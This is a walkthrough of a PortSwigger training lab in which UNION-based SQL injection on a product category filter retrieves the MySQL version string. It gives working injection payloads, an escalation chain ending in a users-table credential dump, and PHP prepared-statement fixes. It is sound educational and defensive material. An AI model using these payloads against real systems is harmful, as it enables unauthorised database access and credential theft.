# PortSwigger — SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection. The backend runs **MySQL 8.0** on Ubuntu. Standard `#` comment syntax fails — the working comment delimiter is `-- -` (double dash + space + dash). Querying `@@version` via a UNION attack reveals the full database version string.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
> To solve the lab, display the database version string.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — Examining the Database**
- Goal: Extract and display the MySQL/Microsoft database version string via UNION injection
- Backend DBMS: **MySQL 8.0.42** on Ubuntu 20.04

---

## Recon

### Step 1 — Identify the injection point

The application exposes a `category` GET parameter when filtering products:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

Appending a single quote `'` to the value triggers a **500 Internal Server Error** — the SQL query breaks, confirming the parameter is injectable.

### Step 2 — DBMS fingerprinting strategy

The lab title mentions both MySQL and Microsoft SQL Server — both support `@@version` for version retrieval. Before querying the version, we need to identify the correct **comment syntax**, which differs between engines:

| DBMS | Comment Syntax |
|---|---|
| **MySQL** | `#` or `-- -` |
| **Microsoft SQL Server** | `--` |
| **Oracle** | `--` |
| **PostgreSQL** | `--` |

This matters because if the comment delimiter is wrong, the trailing quote in the original query causes a syntax error and returns 500.

---

## Exploitation

### Step 2 — Determine the number of columns

Starting with `#` as the comment delimiter:

```
/filter?category='+UNION+SELECT+NULL,NULL#
```

**Response: 500 Internal Server Error** — `#` is not working in this context.

Switching to `-- -` (double dash + space + dash — a common MySQL alternative that ensures the space is preserved after URL encoding):

```
/filter?category='+UNION+SELECT+NULL,NULL-- -
```

**Response: 200 OK** — the page loads normally → **2 columns confirmed**, and `-- -` is the working comment delimiter ✅

### Step 3 — Confirm columns accept string data

```
/filter?category='+UNION+SELECT+'test','test'-- -
```

The string `test` appears in the page → **both columns accept string data** ✅

### Step 4 — Query the database version

Both MySQL and Microsoft SQL Server store version information in the global variable `@@version`. No system table or view is needed — it can be selected directly.

**Final payload:**

```
/filter?category='+UNION+SELECT+@@version,NULL-- -
```

The injected query becomes:

```sql
SELECT name, description FROM products WHERE category = ''
UNION SELECT @@version, NULL-- -'
```

**Response:**

```
8.0.42-0ubuntu0.20.04.1
```

The version string is displayed in the product listing — confirming **MySQL 8.0.42** running on **Ubuntu 20.04** ✅

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Gifts' → 500 error → injection confirmed
        ↓
Test column count + comment: ' UNION SELECT NULL,NULL#
→ 500 error → # not working
        ↓
Switch to: ' UNION SELECT NULL,NULL-- -
→ 200 OK → 2 columns confirmed, -- - is valid delimiter
        ↓
Test string columns: ' UNION SELECT 'test','test'-- -
→ 'test' visible → both columns accept strings
        ↓
Query version: ' UNION SELECT @@version,NULL-- -
        ↓
Response: 8.0.42-0ubuntu0.20.04.1
        ↓
Version string displayed → LAB SOLVED ✅
```

---

## Why `-- -` and not `#` ?

This is a subtle but important point. Both are valid MySQL comment delimiters, but they behave differently depending on context:

- **`#`** — Works fine in MySQL CLI and most raw SQL contexts. However, `#` is a reserved character in URLs (`fragment identifier`) and can be stripped or misinterpreted by the browser or server before reaching the application.

- **`-- -`** — The SQL standard comment is `--` followed by a space. The trailing `-` is added to ensure the space is preserved after URL encoding and HTTP transport. This makes it more reliable when injecting through a URL parameter.

```
# in URL:  /filter?category='--         → browser may strip everything after #
-- - in URL: /filter?category='-- -     → reaches the server intact ✅
```

When `#` fails in a URL context, always try `-- -` next.

---

## MySQL vs Microsoft SQL Server — Key Similarities and Differences

The lab groups MySQL and Microsoft together because they share `@@version`. Here is a fuller comparison:

| Feature | MySQL | Microsoft SQL Server | Oracle | PostgreSQL |
|---|---|---|---|---|
| **Version** | `@@version` | `@@version` | `SELECT banner FROM v$version` | `SELECT version()` |
| **Comment** | `#` or `-- -` | `--` | `--` | `--` |
| **FROM required** | No | No | **Yes** (`dual`) | No |
| **String concat** | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
| **Dummy table** | None needed | None needed | `dual` | None needed |

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Reference |
|---|---|
| **CWE-89** | Improper Neutralization of Special Elements in a SQL Command |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor |
| **OWASP A03:2021** | Injection |
| **CVSSv3** | 7.5 High (information disclosure enabling targeted follow-up attacks) |

**Why version disclosure matters:**

- **MySQL 8.0.42 on Ubuntu 20.04** is very specific — an attacker can immediately look up CVEs for this exact version and OS combination
- Confirms the OS (**Ubuntu 20.04**) — useful for OS-level exploit targeting
- Once UNION injection is confirmed, the same technique trivially extracts `information_schema.tables`, column names, and then actual data
- Reveals the application has **no WAF or input sanitization** — green light for deeper enumeration

**Real-world attack progression:**

```
@@version disclosed (this lab)
        ↓
SELECT table_name FROM information_schema.tables
→ enumerate all tables
        ↓
SELECT column_name FROM information_schema.columns WHERE table_name='users'
→ enumerate sensitive columns
        ↓
SELECT username, password FROM users
→ full credential dump
```

---

### Secure Code Fix

**❌ Vulnerable code (PHP + MySQL):**
```php
$category = $_GET['category'];
$query = "SELECT name, description FROM products WHERE category = '$category'";
$result = mysqli_query($conn, $query);
```

**✅ Fixed with Prepared Statement (MySQLi):**
```php
$stmt = $conn->prepare("SELECT name, description FROM products WHERE category = ?");
$stmt->bind_param("s", $_GET['category']);
$stmt->execute();
$result = $stmt->get_result();
```

**✅ Fixed with PDO:**
```php
$stmt = $pdo->prepare("SELECT name, description FROM products WHERE category = :category");
$stmt->execute([':category' => $_GET['category']]);
```

**✅ Suppress error details:**
```php
mysqli_report(MYSQLI_REPORT_OFF); // Never expose SQL errors to users
// Log internally, return a generic 500 page
```

**Best Practices:**
1. **Parameterized queries** — same fix regardless of MySQL, MSSQL, Oracle, or PostgreSQL
2. **Suppress verbose errors** — a 500 page revealing SQL syntax is an injection oracle; return generic messages only
3. **Least privilege** — the app's DB user should only `SELECT` on the tables it needs, never on `information_schema` or system tables
4. **Keep MySQL up to date** — 8.0.x receives regular security patches; always run the latest patch version
5. **WAF as a secondary layer** — not a substitute for parameterized queries, but useful to detect and log probing attempts

---

## Key Takeaways

**Technical Skills:**
- Confirmed SQL injection via a `'` syntax error test
- Identified that `#` fails in URL context and switched to `-- -` as the working comment delimiter
- Determined column count (2) using `UNION SELECT NULL,NULL-- -`
- Queried `@@version` directly — no system table needed for MySQL/MSSQL
- Retrieved full version string: **MySQL 8.0.42 on Ubuntu 20.04**

**Security Concepts:**
- `@@version` works identically on both **MySQL and Microsoft SQL Server** — one payload, two targets
- Comment delimiter choice (`#` vs `-- -`) is critical in URL injection contexts — `#` is often stripped before reaching the server
- Version disclosure is always a **High severity** finding in real pentests — it is the entry point for targeted exploitation
- UNION-based injection requires column count matching and type-compatible columns — always enumerate before extracting

---

## References

- [PortSwigger — Examining the Database in SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [MySQL `@@version` Documentation](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_version)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP Top 10 2021 — A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)